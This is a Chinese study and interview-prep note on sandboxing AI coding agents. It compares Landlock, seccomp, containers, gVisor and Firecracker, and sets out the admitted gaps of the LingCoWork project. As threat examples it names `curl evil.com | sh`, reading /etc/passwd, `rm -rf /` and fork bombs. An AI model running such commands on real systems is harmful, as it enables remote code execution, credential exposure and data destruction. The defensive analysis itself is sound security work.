# 沙箱：执行隔离的方案全景

> 关联同目录实现笔记：[01-overview-architecture.md](01-overview-architecture.md)（工作区隔离）、
> [03-approval.md](03-approval.md)（effect 审批 = 行为层防线）。

---

## 零、先厘清：沙箱在防什么

沙箱不是"一个东西"，是对**四类越权**的防御，不同层防不同问题：


| 越权类型     | 例子                                                               | 哪层防                      |
| -------- | ---------------------------------------------------------------- | ------------------------ |
| **路径越权** | agent 用 `read_file` 读 `/etc/passwd`，卸 `/etc/ssh/authorized_keys` | 路径校验 / Landlock / chroot |
| **行为越权** | 在 workspace 内执行 `curl evil.com                                   | sh`                      |
| **资源滥用** | 跑个死循环吃满 CPU，fork 炸弹                                              | cgroup / timeout         |
| **内核逃逸** | 利用内核漏洞拿到宿主 root                                                  | 容器 → gVisor → VM 逐档加强    |


**关键认知**：容器防"进程逃逸"，防不了"agent 用合法工具干不该干的事"。
两个维度，必须分开讲。

---



## 一、两大方案


|      | 进程级隔离                                              | 容器                           |
| ---- | -------------------------------------------------- | ---------------------------- |
| 用什么  | 操作系统内核原语（seccomp / Landlock / namespace / cgroup…） | 上述原语的**打包** + overlayfs + 配置 |
| 隔离什么 | 系统调用、路径、网络、资源                                      | 文件系统视图、进程、网络、资源、权限           |
| 典型用户 | Chrome 渲染进程、OpenSSH、systemd                        | Docker / Podman、K8s          |
| 代价   | 轻，毫秒级                                              | 略重，仍是毫秒级                     |
| 逃逸面  | 看组合                                                | 共享宿主内核，**内核漏洞 = 逃逸**         |


**容器不是一种新隔离技术**——它是 chroot/namespace/cgroup/seccomp/caps 的组合打包。
容器与虚拟机的本质区别：**共享宿主内核，隔离的是"视图"不是"内核"**。

**Cursor 本地 Agent 就属于左边这条进程级隔离路线**，不是容器：

- macOS 用 Seatbelt（`sandbox-exec`）限制命令及其整个子进程树
- Linux 用 Landlock 限文件路径、seccomp 限系统调用，并配合 overlay filesystem
- Windows 在 WSL2 中运行这套 Linux 沙箱

它与单纯的“执行前检查路径”不同：限制由操作系统执行，子进程启动后自己调用系统 API 越界，
仍然会被内核拦截。

---



## 二、进程级隔离：内核原语拆解



### 限制文件路径访问


| 机制                         | 平台          | 做什么                                                           | 典型用户                          |
| -------------------------- | ----------- | ------------------------------------------------------------- | ----------------------------- |
| **Landlock**               | Linux 5.13+ | LSM（安全模块），给进程树绑定可访问的**路径白名单**，超出即 EACCES。纯路径语义，不用管 syscall 参数 | runc 可选启用、Chrome 部分类型         |
| **chroot / pivot_root**    | 类 Unix      | 改进程根目录视图，看不到 `/` 真身                                           | 传统 daemon、早期隔离                |
| **unveil / pledge**        | OpenBSD     | 显式声明进程只允许打开哪些路径 / 只用哪些 syscall；调用后永久生效                        | OpenBSD 全系统默认                 |
| **Seatbelt / App Sandbox** | macOS       | profile 声明可读/可写路径、网络、IPC                                      | macOS App Sandbox、Electron 可选 |


Landlock 相对 seccomp 的独特价值：**直接用路径表达"能不能碰这个文件"**，
不用费劲在 syscall 级拼参数过滤。

### 限制网络访问


| 机制                        | 做什么                                                     |
| ------------------------- | ------------------------------------------------------- |
| **network namespace**     | 独立网络栈。最常用：只给 loopback（`--network=none`），进程连外网的能力被内核直接没收 |
| **seccomp-bpf 拦 syscall** | 直接拦 `socket` / `connect` / `bind`，更底层断网                 |




### 限制系统调用


| 机制                  | 做什么                                                    |
| ------------------- | ------------------------------------------------------ |
| **seccomp（strict）** | 只允许 read/write/exit/_exit/sigreturn，其余全拒。极端，Chrome 早期用 |
| **seccomp-bpf**     | BPF 规则逐条过滤，可带**参数匹配**（不是只匹配 syscall 名字）                |




### 资源与权限降级（严格说不是隔离，但常归一类）


| 机制                    | 做什么                                                                      |
| --------------------- | ------------------------------------------------------------------------ |
| **cgroup v2**         | 限制 CPU / 内存 / 磁盘 IO / 进程数。防"占资源"，不防"越权"                                  |
| **capabilities drop** | 去掉 `CAP_SYS_ADMIN`、`CAP_NET_RAW` 等特权能力。容器 runtime 标配                     |
| `no_new_privs`        | `prctl(PR_SET_NO_NEW_PRIVS)`，禁止 setuid 提权——**所有沙箱 runtime 的标配**，防沙箱内逃逸提权 |
| **setuid/setgid 降权**  | 以最小权限用户跑服务。OpenSSH pre-auth（最小权限校验器）、Nginx worker                        |




### 教科书案例：Chrome 渲染进程

```
渲染进程（低权限）
  ├─ setuid sandbox helper（先降权再起渲染进程）
  ├─ seccomp-bpf（只放行白名单 syscall）
  ├─ OS FD 传递（只能收到 pipe 传来的 FD，没有路径访问能力）
  └─ V8 语言层内存隔离
```

Chrome 不装箱子：渲染进程可能几十个，容器太重；用轻量原语组合。
**结论：进程级隔离不是"弱化版容器"，它是另一条更细的技术路线。**

---



## 三、容器：内核原语的打包

```
容器 = namespaces（pid/net/mnt/uts/user/ipc）
     + cgroup（资源）
     + overlayfs / pivot_root（文件系统视图）
     + seccomp-bpf（默认 profile）
     + capabilities drop + no_new_privs
     +（可选）user namespace remap（容器内 root ≠ 宿主 root）
```

**强度取决于组合，不看"是不是 docker"**：
`docker run` 默认 profile 其实很松（很多 CAP 还开着）；
`--cap-drop=ALL` + 严格 seccomp + userns remap 才接近真隔离。

### 容器之上的两档更强形态


|                        | 隔离层                     | 逃逸面              |
| ---------------------- | ----------------------- | ---------------- |
| **容器**                 | 共享宿主内核                  | 内核漏洞 = 逃逸        |
| **gVisor**             | 用户态内核，syscall 拦在用户态翻译执行 | 逃逸面大幅缩小（仍共享底层）   |
| **Firecracker / Kata** | 轻量 VM，真独立内核             | 需要 hypervisor 漏洞 |


Cursor Cloud Agent 使用 Firecracker microVM，属于这一档；它和本地 Cursor 的进程级沙箱
不是同一种隔离强度。

---



## 四、纵深防御：四层叠加才是完整答案

```
┌──────────────────────────────────────────┐
│  L4 权限模型 / 策略引擎（LingCoWork 主力）│  ← 行为层：防"合法工具干坏事"
│  effect 分类 + 审批 + 破坏性命令 AST 分析 │
├──────────────────────────────────────────┤
│  L3 容器 / VM（云端 Agent 需要）          │  ← 物理层：防进程逃逸
│  namespaces + overlayfs + seccomp + gVisor│
├──────────────────────────────────────────┤
│  L2 进程级隔离（LingCoWork 只有进程组）    │  ← 内核原语：seccomp / Landlock / cgroup
├──────────────────────────────────────────┤
│  L1 路径校验（LingCoWork 已有）            │  ← 应用层：workspace 围栏 + 读写分级
└──────────────────────────────────────────┘
```


| 谁                | L1 路径 | L2 进程                            | L3 容器 / VM             | L4 策略 |
| ---------------- | ----- | -------------------------------- | ---------------------- | ----- |
| **LingCoWork**   | ✅     | ⚠️ 仅进程组                          | ❌                      | ✅     |
| **Cursor（本地）**   | ✅     | ✅（Seatbelt / Landlock + seccomp） | ❌                      | ✅     |
| **Cursor Cloud** | ✅     | ✅                                | ✅（Firecracker microVM） | ✅     |


结论：**LingCoWork 当前主要靠 L1 + L4；Cursor 本地已经叠加 L2；Cursor Cloud 再升级到
独立 microVM。策略引擎是行为防线，OS 沙箱 / VM 是执行边界，两者不能互相替代。**

---



## 五、LingCoWork 现状与诚实边界

- 路径层：`internal/agent/scope/scope.go`，写操作与命令 cwd 限定 workspace + `..` 遍历检查；
读操作允许绝对路径（单用户本地机的合理放宽）
- 执行层：`shell.go` 的 cwd 一律要求 workspace 内（比读更严），进程组隔离 + 超时 SIGKILL
- 行为层：effect 审批、破坏性命令 AST 分析、MCP 信任非对称、fail-closed 兜底——**这是项目最强的一层**

诚实的边界：

1. **符号链接不防**——`scope.Resolve` 是字符串级路径校验，不调 `EvalSymlinks`
2. **进程不隔离**——fork 的 shell 跑在宿主进程，能碰环境变量、网络、任意 syscall
3. **命令内容不拦**——`rm -rf /` 理论上能执行（靠审批拦，不靠沙箱拦），网络不隔离（`curl` 随意外发）

这些边界对桌面单机形态成立（宿主 = 用户自己，威胁模型不需要防自身逃逸）；
但对云端 Agent 不成立——这正是面试里要接住的部分。

---



## 六、面试答题



### 30 秒版

> 沙箱我分两类。轻量进程级隔离用内核原语：路径访问用 Landlock/chroot，网络用 network namespace 或 seccomp 拦 syscall，资源用 cgroup，提权防护用 no_new_privs——Chrome 渲染进程是教科书。容器是这些原语的打包，加 namespaces 和 overlayfs，共享宿主内核所以不是 VM；更强的还有 gVisor 和 Firecracker。
>
> 我项目做的是应用层路径围栏 + effect 审批，进程/网络级隔离没做——桌面单机形态不需要。但策略引擎是逻辑层、容器是物理层，两者不冲突：容器防逃逸，审批防"合法工具干不该干的事"。云上形态要在现策略引擎上叠加容器 + seccomp 组合。



### 被追问"为什么布局里审批比容器重要"

> 容器防的是进程逃逸到大纲，但防不了 agent 在容器内执行 `curl evil.com | sh`——命令没逃逸，行为却是恶意的。effect 分类 + 审批 + fail-closed 兜底是行为级防线，Claude Code 这一级本地工具不做容器，但审批一定有。容器是云端场景的增量，策略引擎是普适层。



### 被追问"符号链接 / TOCTOU"

> 诚实说当前字符串级校验不防 symlink。要防的话在写操作后调 EvalSymlinks 核对最终路径还在 workspace 内；TOCTOU（校验后、打开前被换）要 openat2 的 RESOLVE_BENEATH 这类原子语义才能彻底解——本地单用户形态没到需要那一层。



### 被追问"如果真要做云上沙箱从哪开始"

> 从四层里缺口最大的开始：进程级隔离先上 seccomp-bpf + Landlock 组合（轻、无容器依赖），
> 再加 cgroup 限资源；然后容器把文件系统视图、网络、用户空间一次性隔离；
> 上线前还要加 egress 防火墙白名单。策略引擎（effect 审批）从头就在，不用动。

---



## 关联

- 工作区隔离与审批实现：本目录 [01-overview-architecture.md](01-overview-architecture.md)、[03-approval.md](03-approval.md)
- 工具面与安全分层总览：`../coding/01-coding-agent-design.md` 第四节
- 多 Agent 与上下文策略待写专篇：`../coding/03-multi-agent.md`、`../coding/04-context-strategies.md`（占位）

